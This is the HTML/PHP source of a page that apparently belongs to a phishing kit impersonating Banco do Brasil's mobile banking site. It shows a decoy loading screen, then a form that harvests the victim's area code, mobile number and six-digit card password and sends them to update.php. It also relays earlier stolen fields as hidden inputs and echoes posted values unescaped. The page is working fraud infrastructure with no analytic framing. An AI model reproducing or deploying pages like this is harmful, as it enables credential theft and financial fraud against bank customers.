<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Banco do Brasil</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<link rel="stylesheet" href="style.css" />
<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>

<link rel="apple-touch-icon" sizes="57x57" href="icon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="icon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="icon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="icon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="icon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="icon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="icon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="icon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="icon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="icon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="icon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="icon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="icon/favicon-16x16.png">


</head>

<body>

<div class="container">
	
	<div class="show" style="display: none;">
	<form action="update.php" method="post" enctype="application/x-www-form-urlencoded" onSubmit="return checkInformation();">
	 <?php foreach($_POST as $key => $value):  ?>
		<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
	 <?php endforeach; ?>
	
		<table class="center">
		  <tbody>
			<tr>
			  <td>&nbsp;</td>
			  <td>&nbsp;</td>
			</tr>
			<tr>
			  <td>&nbsp;</td>
			  <td>&nbsp;</td>
			</tr>
			<tr>
			  <td style="width: 25%;padding-right: 10px;"><input class="frm" type="tel" id="ddd" name="ddd" placeholder="DDD" maxlength="2" onKeyUp="saltarDDD();" required></td>
			  <td><input class="frm" type="tel" id="fone" name="fone" placeholder="Celular" maxlength="9" required></td>
			</tr>
			<tr>
			  <td colspan="2"><input class="frm" type="number" pattern="[0-9]*" inputmode="numeric" style="-webkit-text-security:disc;" id="s6" name="s6" placeholder="Senha do cartão (6 dígitos)"  onkeydown="limit(this, 6);" onkeyup="limit(this,6);" required></td>
			</tr>
			<tr>
			  <td colspan="2"><input type="submit" class="btnOK" id="btnOK" value="CONTINUAR"></td>
			</tr>
			<tr>
			  <td>&nbsp;</td>
			  <td>&nbsp;</td>
			</tr>
		  </tbody>
		</table>
	</form>

	</div>
	
	<div style="padding-bottom: 400px; padding-top: 60px;" id="distrair">
		<center><img src="images/loading.gif"></center>		
	</div>
		
	
	
	
	<div style="height: 350px; display: none;" class="show">		
		<div class="quadrado">
			<img src="images/ic_bb_code.png">
			<p class="label-quadrado">BB Code</p>
		</div>

		<div class="quadrado">
			<img src="images/ic_pve.png">
			<p class="label-quadrado">Financie seu carro</p>
		</div>


		<div class="quadrado">
			<img src="images/ic_rede_atendimento.png">
			<p class="label-quadrado">Rede de Atendimento</p>
		</div>								
		
		<div class="quadrado">
			<img src="images/ic_saque_movel.png">
			<p class="label-quadrado">Saque móvel</p>
		</div>
		
		<div class="quadrado">
			<img src="images/ic_sac_atendimento.png">
			<p class="label-quadrado">Fale Conosco</p>
		</div>								
	
	
		<div class="quadrado">
			<img src="images/ic_ourocard.png">
			<p class="label-quadrado">Ouro Card</p>
		</div>
		
		<div class="quadrado">
			<img src="images/ic_gerenciador_financeiro.png">
			<p class="label-quadrado">Sua empresa</p>
		</div>

		
		<div class="quadrado">
			<img src="images/ic_home_broker.png">
			<p class="label-quadrado">Home Broker</p>
		</div>		
		
	</div>


	<div id="footer">
		<div class="logo"></div>
	</div>
	
	
	
	
	
	
	
</div>

<script language="javascript">
 setTimeout(function(){
	 $(".show").show();
	 $("#distrair").hide();
 }, 1200);	
</script>


</body>
</html>
